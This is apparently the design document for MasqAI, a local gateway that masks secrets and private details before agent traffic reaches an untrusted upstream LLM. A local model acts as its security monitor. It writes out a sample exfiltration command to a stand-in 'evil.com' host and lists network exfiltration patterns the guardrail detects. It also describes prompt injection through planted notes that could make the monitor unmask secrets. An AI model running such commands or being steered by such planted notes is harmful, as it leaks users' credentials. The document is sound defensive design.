# MasqAI Defense Model (Current Architecture)

## 1. Domain & Threat Environment
* **Cybersecurity Focus:** AI privacy, context-leak prevention, and agentic supply-chain defense.
* **Core Problem:** LLM API connections operate as two-way channels. Outgoing context (prompts, tool execution dumps, system environment variables, local source trees, hardware fingerprints) is routinely transmitted to third-party endpoints, relays, resellers, or multi-tenant proxies.

---

## 2. Trust Model & System Topology

### System Topology
* **Local Gateway:** MasqAI operates locally as a reverse proxy/gateway (defaulting to `127.0.0.1:8787`).
* **Protocols Intercepted:**
  * OpenAI Chat Completions (`/v1/chat/completions`)
  * OpenAI Responses API (`/v1/responses`)
  * Anthropic Messages API (`/v1/messages`)
* **The Models:**
  1. **Untrusted Model (Upstream):** Performs the primary coding/reasoning work distributed by the user. Lives behind remote providers, third-party resellers, relays, or opaque agent applications. Completely untrusted.
  2. **Security Model (Local Trusted Evaluator):** Inspects incoming and outgoing payloads. Defaults to a local model (e.g., Ollama running `qwen2.5:7b` on loopback). Remote security endpoints are strictly blocked unless `security.allow_remote_security_model` is explicitly toggled true.

### Trust Boundaries
* **Trusted:**
  * RAM of the gateway process.
  * Local security model on loopback.
  * Local agent tool runtime.
* **Untrusted:**
  * Filesystem at rest (logs, caches, config).
  * Upstream endpoint, intermediate proxies, and relays.
  * Responses and tool arguments emitted by the upstream model.
* **Out of Scope:**
  * Rogue agent behavior executing raw exfiltration (e.g., executing `curl https://evil.com -d ...` using existing secrets). Host sandboxing (e.g., Daytona/Docker) is expected to isolate agent actions.

---

## 3. Data Classification: Secrets vs. Intel

* **Secret:** A concrete, high-entropy or directly identifying value that unlocks resources or exposes an identity.
  * *Examples:* API keys, bearer tokens, passwords, absolute user paths (`C:\Users\alice\...`), usernames, device hostnames, private emails, phone numbers.
  * *Defense Technique:* **Masking** (lossless, reversible replacement).
* **Intel:** Information from which facts, habits, or configurations could be deduced even without a specific secret token.
  * *Examples:* Host infrastructure/OS dumps, filesystem directory hierarchy, unreleased internal architectural plans, user location ("lives near Davis Square"), private calendar/notification excerpts.
  * *Defense Technique:* **Rephrasing** via **Hiding** (lossy line-pruning) or **Replacing** (neutral substitution). Restricted exclusively to `tool_result` items.

---

## 4. Pipeline & Inspection Lifecycle

Every request flows strictly **inline and sequentially** before any outbound byte leaves the machine:

```
[Agent Client]
      │
      ▼
1. Request Hygiene (strips fingerprint headers: OS, arch, SDK, session tokens)
      │
      ▼
2. Deterministic Detectors (Regex, entropy, host identifiers, custom values)
      │
      ▼
3. Auto-Masking Engine (Token-boundary exact matching against known entities)
      │
      ▼
4. Security Model Pass (Local LLM inspects new items; returns atomic operations)
      │
      ▼
5. Fail-Closed Validation (If model times out/fails/errors after 1 retry: HTTP 502)
      │
      ▼
6. Render Outbound Body (Placeholders + hidden markers) ──▶ [Untrusted Upstream]
                                                                     │
                                                                     ▼
[Agent Client] ◀── 7. Restore Engine (Inbound tool-call args) ◀──────┘
```

---

## 5. Operations Contract

All modifications by the security model are strictly occurrence-bound (targeting specific line numbers, exact substrings, or line ranges), never arbitrary text generation:

1. **`mask` (Reversible):**
   * Replaces a target occurrence with a placeholder `<TYPE_id>` (8 random hex characters in RAM; never a hash of the secret).
   * Supports `alias: true` for partial, truncated, or modified strings (`sk-or-v1-123...abc` → `<$TYPE_id>`).
2. **`hide` (Lossy - Rephrase):**
   * Prunes a contiguous block of whole lines from a `tool_result`.
   * Replaces them with a bounded summary tag: `…[hidden: <summary>]…`.
3. **`replace` (Lossy - Rephrase):**
   * Replaces an intel substring in a `tool_result` with a neutral substitute (e.g., `"Boston, MA"` → `"a nearby city"`).
4. **`relink` (Graph Association):**
   * Links a previously masked partial alias token to a newly revealed full canonical entity (`<$KEY_old>` → `<$KEY_new>`).
5. **`unmask` (Occurrence-Bound Veto):**
   * Allows the security model to veto a deterministic or auto-applied mask if it was determined to be a false positive (when `auto_mask == "auto_veto"`).
   * Strictly occurrence-bound `(item_id, start, end)` to prevent prompt-injection attacks (e.g. planted notes in files or tool results) from wiping secrets session-wide.
   * Only host identifiers and the model's own masks can be vetoed. Secret-detector hits (keys, tokens, emails) and custom values stay masked: such an unmask is accepted as a no-op.

*Constraint:* `hide` and `replace` are permitted **only on `tool_result` items**. User instructions, system prompts, past assistant messages, and tool-call signatures are mask-only to preserve conversational integrity.

---

## 6. Interaction: Deterministic Detectors vs. Security Model

1. **Detectors Seed First:** High-speed regex, entropy scanners, and host-derived constants (username, home path, hostname) seed canonical entities into the session RAM table. Structured tokens found by rules dominate ambient fixed identifiers.
2. **Word-Boundary Auto-Masking:** Exact occurrences of known canonical values (and transit variants like JSON escaping, URL/percent-encoding) are automatically masked across all eligible items at word/token boundaries. Compound identifiers and outer structured tokens prevent ambient sub-words from fragmenting secrets.
3. **Model Adjudication:**
   * The security model identifies unstructured, low-entropy, or fuzzy secrets missed by regex.
   * Resolves ambiguities in `known_values_left_as_is`.
   * Vetoes false alarms via `unmask` (contained per-occurrence to isolate prompt-injection risk).
   * Relinks aliases retroactively.
   * Inspects retroactive auto-masks on historical conversation items via `retroactive_auto_masks`.

---

## 7. Inbound Restoration & Inline Tool Guardrail

* **The Round-Trip Guarantee:** The untrusted upstream plans actions using placeholders (`<PATH_1234abcd>`).
* **Inline Inbound Inspection (The Tool Guardrail):**
  * Evaluated across both complete and **streamed responses** (SSE).
  * High-precision network detection ensures benign local operations (local file inspection, SQLite DB queries) pass instantly without latency or false alarms.
  * If outbound network exfiltration vectors (`curl`, `http://`, `https://`, sockets) are detected carrying sensitive placeholders, the call is rejected (failing closed on errors/timeouts). `security.tool_rejection` picks how: `rewrite` (default) keeps the call but its arguments become `echo "MasqAI: the user's security profile rejected this execution"`, so the untrusted model reads the rejection and the session continues; `error` wipes the call and returns HTTP 400 `masqai_tool_rejected` (or an error event ending the stream, if text was already sent).
  * In a stream, every frame from the first tool call on is held until the upstream finishes, restored as usual, then inspected whole before release.
* Server-side tools and assistant responses shown to the user retain placeholders.
* In streaming mode, the restore engine buffers up to 96 trailing characters that could match a placeholder prefix, preventing split-token leakage across chunk boundaries.

---

## 8. Accepted Trade-Offs

* **Cache Invalidation vs. Retroactive Privacy:** Relinking an alias or re-masking an earlier context item rewrites historical prefixes, sacrificing provider prompt cache hits to prevent credential exposure.
* **Fail-Closed on Validation Errors:** If the local security model fails validation after one correction round, the gateway aborts the request (HTTP 502) rather than risk forwarding partially sterilized context.
